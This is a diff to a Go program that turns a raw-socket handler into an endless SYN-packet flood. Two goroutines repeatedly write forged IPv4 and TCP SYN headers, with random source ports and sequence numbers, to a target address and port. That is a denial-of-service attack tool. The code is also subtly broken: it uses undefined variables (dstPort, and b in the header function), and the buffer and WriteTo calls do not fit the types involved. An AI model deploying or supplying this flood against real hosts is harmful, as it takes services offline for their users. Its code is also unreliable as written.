@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"encoding/binary"
 	"flag"
 	"fmt"
@@ -53,13 +54,25 @@ func handle(ip net.IP, port int) {
 	file := os.NewFile(uintptr(fd), "socket")
 
 	//文件对象转成go socket对象
-	rawSocket, err := net.FilePacketConn(file)
+	rawSocket, err := net.FileConn(file)
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
-	fmt.Println(rawSocket)
+	for i := 0; i < 2; i++ {
+		go func() {
+			var b bytes.Buffer
+			for {
+				b.Write(getIPV4Header(ip))
+				b.Write(getTcpHeader(dstPort))
+				rawSocket.WriteTo(b)
+			}
+		}()
+	}
+
+	c := make(chan int, 1)
+	<-c
 }
 
 func getIPV4Header(destIp net.IP) []byte {
@@ -74,6 +87,24 @@ func getIPV4Header(destIp net.IP) []byte {
 		Checksum: 0,
 		Src:      srcIP,
 		Dst:      destIP,
+	}
+
+	b.Checksum = int(crc16(h.Marshal()))
+
+	return h.Marshal()
+}
+
+func getTcpHeader(dstPort int) []byte {
+	rand.Seed(time.Now().UnixNano())
+
+	h := &tcpHeader{
+		Src:  rand.Intn(1<<16-1)%16383 + 49152,
+		Dst:  dstPort,
+		Seq:  uint32(rand.Intn(1<<32 - 1)),
+		Ack:  0,
+		Flag: 0x02,
+		Win:  2048,
+		Urp:  0,
 	}
 
 	b.Checksum = int(crc16(h.Marshal()))
